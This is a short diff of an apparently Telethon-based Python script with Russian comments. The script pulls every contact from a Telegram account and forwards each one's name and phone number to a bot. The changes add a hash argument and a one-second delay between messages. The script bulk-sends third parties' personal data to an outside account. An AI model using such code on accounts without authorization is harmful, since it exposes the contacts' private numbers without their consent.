@@ -14,7 +14,7 @@ async def main():
     await client.start()
 
     # Получаем контакты
-    result = await client(GetContactsRequest())
+    result = await client(GetContactsRequest(hash=0))  # Передаем hash=0
     contacts = result.users  # Контакты возвращаются в users
 
     # Пересылаем каждый контакт в бота
@@ -24,7 +24,7 @@ async def main():
             message = f"Имя: {contact.first_name}, Фамилия: {contact.last_name}, Номер: {contact.phone}"
             await client.send_message(bot_username, message)
             print(f"Отправлено: {message}")
-            await asyncio.sleep(0)  # Задержка 0 секунд (не рекомендуется)
+            await asyncio.sleep(1)  # Задержка 1 секунда (можно увеличить для уменьшения нагрузки)
 
 with client:
     client.loop.run_until_complete(main())
